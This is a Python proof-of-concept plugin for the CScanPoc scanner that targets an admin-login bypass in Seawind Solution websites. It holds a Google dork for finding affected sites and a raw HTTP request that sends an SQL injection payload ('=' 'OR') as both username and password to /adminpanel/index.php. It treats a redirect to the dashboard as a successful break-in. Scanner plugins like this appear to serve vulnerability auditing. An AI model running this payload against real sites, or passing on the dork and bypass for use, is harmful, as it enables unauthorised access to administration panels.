# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'SeawindSolution_0001' # 平台漏洞编号，留空
    name = 'SeawindSolution 万能密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-07-24'  # 漏洞公布时间
    desc = '''
        Seawind Solution Bypass Admin Page Vulnerability.
        Google Dork : intext:"Design & Developed By Seawind Solution Pvt.Ltd."
        /adminpanel/index.php 万能密码。
    '''  # 漏洞描述
    ref = 'http://cxsecurity.com/issue/WLB-2015070122'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'SeawindSolution'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3d2ed21e-8d97-44bd-84b2-2dc03fe58064'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Google Dork : intext:"Design & Developed By Seawind Solution Pvt.Ltd."
            hh = hackhttp.hackhttp()
            raw = """
POST /adminpanel/index.php HTTP/1.1
Host: www.baidu.com
Content-Length: 59
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8

A_USERNAME=%27%3D%27+%27OR%27&A_PASSWORD=%27%3D%27+%27OR%27
            """

            verify_url = self.target + '/adminpanel/index.php'
            code, head,res, errcode, _ = hh.http(verify_url, raw=raw)

            if code == 302 and 'location: dashboard.php' in head:
                #security_hole(url + "\t'=' 'OR','=' 'OR'")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
